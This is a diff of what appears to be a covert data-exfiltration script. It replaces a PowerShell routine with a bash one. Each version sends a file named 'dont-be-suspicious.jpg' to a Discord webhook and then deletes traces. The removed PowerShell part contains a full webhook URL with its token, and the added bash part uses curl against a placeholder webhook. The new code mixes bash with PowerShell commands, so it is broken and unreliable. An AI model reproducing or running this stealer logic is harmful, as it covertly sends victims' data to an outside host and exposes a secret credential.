@@ -292,26 +292,40 @@ rm $env:TEMP\foo.txt,$env:TEMP\foo.jpg -r -Force -ErrorAction SilentlyContinue
 
 #----------------------------------------------------------------------------------------------------
 
-cd desktop
+#!/bin/bash
 
-# Create a temporary file to store the message and image data
-$uploadFile = "$env:TEMP\dont-be-suspicious.jpg"
-$content | Out-File $uploadFile
+# Change directory to the desktop
+cd ~/Desktop
 
-# Define the Discord webhook URL
-$webhookUrl = "https://discord.com/api/webhooks/1142771187911491634/-dCQIMjVWOGb44g8_thI5jTXQgbBuyo0Tskjds4q9iRoP5pOAZXypUroz9u_X8PfbT03"
+# Specify the Discord webhook URL
+WEBHOOK_URL="YOUR_DISCORD_WEBHOOK_URL"
 
-# Create a hashtable for the multipart form data
-$formData = @{
-    content = "boe"
-    file = [System.IO.File]::ReadAllBytes($uploadFile)
-}
+# Specify the image file path
+IMAGE_PATH="dont-be-suspicious.jpg"
 
-# Send the file to the Discord webhook
-$response = Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "multipart/form-data" -InFile $uploadFile -Body $formData
+# Set the message for the Discord content
+CONTENT="Your message goes here"
 
-# Clean up the temporary file
-Remove-Item -Path $uploadFile -Force
+# Create a boundary string for the multipart/form-data
+BOUNDARY="------------------------$(date +%s)"
+
+# Build the JSON payload
+JSON='{"content":"'$CONTENT'"}'
+
+# Send the JSON payload to the webhook
+curl -X POST -H "Content-Type: application/json" -d "$JSON" "$WEBHOOK_URL"
+
+# Build the multipart/form-data payload
+DATA="\
+--$BOUNDARY\r\n\
+Content-Disposition: form-data; name=\"file\"; filename=\"dont-be-suspicious.jpg\"\r\n\
+Content-Type: image/jpeg\r\n\
+\r\n\
+$(cat $IMAGE_PATH)\r\n\
+--$BOUNDARY--"
+
+# Send the multipart/form-data payload to the webhook
+curl -X POST -H "Content-Type: multipart/form-data; boundary=$BOUNDARY" --data-binary "$DATA" "$WEBHOOK_URL"
 
 # Delete the file from the Desktop
 Remove-Item -Path "dont-be-suspicious.jpg" -Force
